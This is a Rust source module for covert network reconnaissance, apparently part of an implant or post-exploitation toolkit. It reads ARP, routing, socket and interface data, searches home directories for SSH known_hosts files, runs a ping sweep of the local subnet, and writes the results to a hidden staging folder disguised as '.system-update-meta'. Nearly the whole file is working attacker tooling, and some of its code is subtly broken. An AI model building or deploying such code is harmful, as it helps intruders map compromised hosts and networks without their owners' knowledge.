/// Network reconnaissance.
///
/// Two modes:
///   gather_to_staging() — shell commands + optional ping sweep (tier1/2)
///   gather_in_memory()  — direct /proc reads, passive only (tier3)

use std::fs;
use std::io;
use std::process::Command;

pub struct NetInfo {
    pub arp_table: String,
    pub tcp_conns: String,
    pub tcp_listeners: String,
    pub udp_listeners: String,
    pub fib_trie: String,
    pub ifaces: String,
    pub hostname: String,
}

/// In-memory recon (tier3) — passive, reads /proc and /sys directly.
pub fn gather_in_memory() -> io::Result<NetInfo> {
    Ok(NetInfo {
        arp_table: fs::read_to_string("/proc/net/arp").unwrap_or_default(),
        tcp_conns: fs::read_to_string("/proc/net/tcp").unwrap_or_default(),
        tcp_listeners: fs::read_to_string("/proc/net/tcp6").unwrap_or_default(),
        udp_listeners: fs::read_to_string("/proc/net/udp").unwrap_or_default(),
        fib_trie: fs::read_to_string("/proc/net/fib_trie").unwrap_or_default(),
        ifaces: gather_ifaces().unwrap_or_default(),
        hostname: fs::read_to_string("/proc/sys/kernel/hostname")
            .unwrap_or_default().trim().to_string(),
    })
}

/// Shell-based recon (tier1/2) — forks commands, writes to staging_dir/.system-update-meta/
pub fn gather_to_staging(staging_dir: &str, do_ping_sweep: bool) -> io::Result<NetInfo> {
    let meta = format!("{}/.system-update-meta", staging_dir);
    let _ = fs::create_dir_all(&meta);
    let net_file = format!("{}/network.txt", meta);

    let mut out = String::new();

    out.push_str(&format!("=== Host: {} ===\n", hostname_str()));
    out.push_str("=== ARP Cache ===\n");
    if let Ok(o) = Command::new("sh").arg("-c").arg("cat /proc/net/arp 2>/dev/null; ip neigh show 2>/dev/null").output() {
        out.push_str(&String::from_utf8_lossy(&o.stdout));
    }
    out.push_str("\n=== /etc/hosts ===\n");
    if let Ok(d) = fs::read_to_string("/etc/hosts") {
        out.push_str(&d);
    }
    out.push_str("\n=== SSH Known Hosts ===\n");
    let _ = Command::new("sh").arg("-c")
        .arg("find /home -name known_hosts -exec echo '--- {} ---' \\; -exec cat {} \\; 2>/dev/null")
        .output();
    out.push_str("\n=== Interfaces ===\n");
    if let Ok(o) = Command::new("sh").arg("-c").arg("ip -4 addr show 2>/dev/null").output() {
        out.push_str(&String::from_utf8_lossy(&o.stdout));
    }
    out.push_str("\n=== Listening Services ===\n");
    if let Ok(o) = Command::new("sh").arg("-c").arg("ss -tlnp 2>/dev/null").output() {
        out.push_str(&String::from_utf8_lossy(&o.stdout));
    }

    // Ping sweep
    if do_ping_sweep {
        out.push_str("\n=== Live Hosts (ping sweep) ===\n");
        if let Ok(o) = Command::new("sh").arg("-c")
            .arg("ip -4 addr show scope global 2>/dev/null | grep -oP 'inet \\K[\\d.]+' | while read ip; do \
                  subnet=$(echo $ip | cut -d. -f1-3); \
                  for i in $(seq 1 254); do \
                    (ping -c1 -W1 $subnet.$i >/dev/null 2>&1 && echo \"[LIVE] $subnet.$i\") & \
                  done; \
                  wait; \
                  done 2>/dev/null")
            .output()
        {
            out.push_str(&String::from_utf8_lossy(&o.stdout));
        }
    }

    fs::write(&net_file, &out)?;

    // Build NetInfo for result.json
    Ok(NetInfo {
        arp_table: fs::read_to_string("/proc/net/arp").unwrap_or_default(),
        tcp_conns: fs::read_to_string("/proc/net/tcp").unwrap_or_default(),
        tcp_listeners: fs::read_to_string("/proc/net/tcp6").unwrap_or_default(),
        udp_listeners: fs::read_to_string("/proc/net/udp").unwrap_or_default(),
        fib_trie: fs::read_to_string("/proc/net/fib_trie").unwrap_or_default(),
        ifaces: gather_ifaces().unwrap_or_default(),
        hostname: hostname_str(),
    })
}

fn gather_ifaces() -> io::Result<String> {
    let mut out = String::new();
    let entries = fs::read_dir("/sys/class/net")?;
    for entry in entries {
        let entry = entry?;
        let name = entry.file_name();
        let name = name.to_string_lossy();
        let addr_path = format!("/sys/class/net/{}/address", name);
        if let Ok(mac) = fs::read_to_string(&addr_path) {
            out.push_str(&format!("{}: {}\n", name, mac.trim()));
        }
    }
    Ok(out)
}

fn hostname_str() -> String {
    fs::read_to_string("/proc/sys/kernel/hostname")
        .unwrap_or_default().trim().to_string()
}
